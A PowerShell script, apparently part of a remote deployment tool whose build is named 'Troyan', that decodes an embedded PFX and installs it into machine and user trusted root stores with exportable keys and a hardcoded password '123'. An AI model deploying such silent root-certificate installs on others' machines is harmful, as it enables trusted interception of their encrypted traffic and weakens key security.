# consts_cert.ps1 is generated at Troyan build time: $xdata holds chunked base64 of the Hephaestus LAN TLS PFX
# (already copied into panel user data before embed). Remote machines only decode/install; they never touch panel paths.
. ./consts_body.ps1
. ./consts_cert.ps1
. ./utils.ps1

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    CustomDecode -inContent $contentString -outFile $outputFilePath

    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Install for Local Machine
        $stores = @("Cert:\LocalMachine\My", "Cert:\LocalMachine\Root")

        # Install for Current User
        $stores += @("Cert:\CurrentUser\My", "Cert:\CurrentUser\Root")

        foreach ($store in $stores) {
            Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $store -Password $securePassword -ErrorAction Stop
            Write-Host "Certificate installed successfully to $store"
        }

        # Same PFX again at true machine store semantics (scripts/install-hephaestus-cert.ps1): MachineKeySet|PersistKeySet|Exportable.
        # Import-PfxCertificate to Cert:\LocalMachine\My can differ for private key placement; this complements it when elevated.
        if (IsElevated) {
            try {
                $machineMyFlags = [int](
                    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable -bor
                    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::MachineKeySet -bor
                    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::PersistKeySet) -band (-bnot [int][System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::UserProtected)
                $mc = $null
                try {
                    $mc = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertificateFilePath, $Password, $machineMyFlags)
                    $myLm = New-Object System.Security.Cryptography.X509Certificates.X509Store(
                        [System.Security.Cryptography.X509Certificates.StoreName]::My,
                        [System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine)
                    $myLm.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
                    try {
                        $myLm.Add($mc)
                    }
                    finally {
                        $myLm.Close()
                    }
                    writedbg "cert: explicit LocalMachine\My (MachineKeySet) ok thumb=$($mc.Thumbprint)"
                }
                finally {
                    if ($null -ne $mc) { $mc.Dispose() }
                }
            }
            catch {
                writedbg "cert: explicit LocalMachine\My skipped or failed (often duplicate thumbprint): $_"
            }
        }
        else {
            writedbg "cert: skipped explicit LocalMachine\My (not elevated)."
        }
    } catch {
        throw "Failed to install certificate: $_"
    }
}

function do_cert {
    try 
    {
        foreach ($key in $xdata.Keys) {
            Cert-Work -contentString $xdata[$key]
        }
    }
    catch {
        writedbg "An error occurred (ConfigureCertificates): $_"
      }
}

do_cert